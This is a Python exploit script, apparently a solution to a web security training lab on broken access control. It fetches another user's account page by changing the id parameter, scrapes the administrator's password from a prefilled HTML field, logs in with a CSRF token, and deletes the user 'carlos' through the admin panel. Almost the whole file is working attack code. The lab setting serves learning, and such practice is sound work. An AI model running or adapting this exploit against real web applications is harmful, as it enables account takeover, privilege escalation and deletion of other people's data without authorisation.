import requests
import sys
import urllib3
from bs4 import BeautifulSoup

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http' : 'http://127.0.0.1:8080' , 'https' : 'http://127.0.0.1:8080'}

def get_adminpws(s, url):
    print("[+] Extracting the administrator password...")
    admin_account_url = url + "/my-account?id=administrator"
    print("[+] Payload: GET %s" % admin_account_url)
    r = s.get(admin_account_url, verify=False, proxies=proxies)
    if "Log out" and "administrator" in r.text:
        soup = BeautifulSoup(r.text, "html.parser")
        password = soup.find('input', {'name' : 'password'})['value']
        print("[+] Found it! The password is %s" %password)
        return password
    print("[-] Something went wrong! Could not extract the administrator password!")
    sys.exit(-1)


def get_csrf_token(s, url):
    r = s.get(url, verify=False, proxies=proxies)
    soup = BeautifulSoup(r.text, "html.parser")
    csrf_token = soup.find("input", {'name' : 'csrf'})['value']
    return csrf_token


def delete_user_carlos(s, url, administrator_password):
    print("[+] Login now as the user adminisrator")
    login_url = url + "/login"
    csrf_token = get_csrf_token(s, login_url)
    params = {
        'csrf' : csrf_token,
        'username' : 'administrator',
        'password' : administrator_password
    }
    
    r = s.post(login_url, data=params, verify=False, proxies=proxies)
    if "Log out" and "administrator" in r.text:
        print("[+] Login complete, deleting now the user carlos")
        delete_url = url + "/admin/delete?username=carlos"
        r = s.get(delete_url, verify=False, proxies=proxies)
        if "carlos" not in r.text:
            print("[+] Exploit succeeded!")
            return
        else:
            print("[-] Problem ahed! Try again!")
            sys.exit(-1)
    else:
        print("[-] Did not work!")
        sys.exit(-1)
        


def main():
    if len(sys.argv) != 2:
        print("[-] Usage: %s <url>" % sys.argv[0])
        print("[-] Example: %s www.example.com" % sys.argv[0])
        sys.exit(-1)
    
    s = requests.Session()

    url = sys.argv[1].strip()
    print("\n[+] Lab: User ID controlled by request parameter with password disclosure")
    print("[+] The WebApp is vulnerable to Access Control violation, resulting in access to other users private area and escalation to admin privileges")
    print("[+] Users can change their passwords using a special function after they log in")
    print("[+] The field in which must be put the new password is prefilled with the current one, clear-text readable in the html body")
    print("[+] Accessing another user private area means finding its current password and, in case of admin users, access to an admin panel\n")

    administrator_password = get_adminpws(s, url)
    delete_user_carlos(s, url, administrator_password)



if __name__ == "__main__":
    main()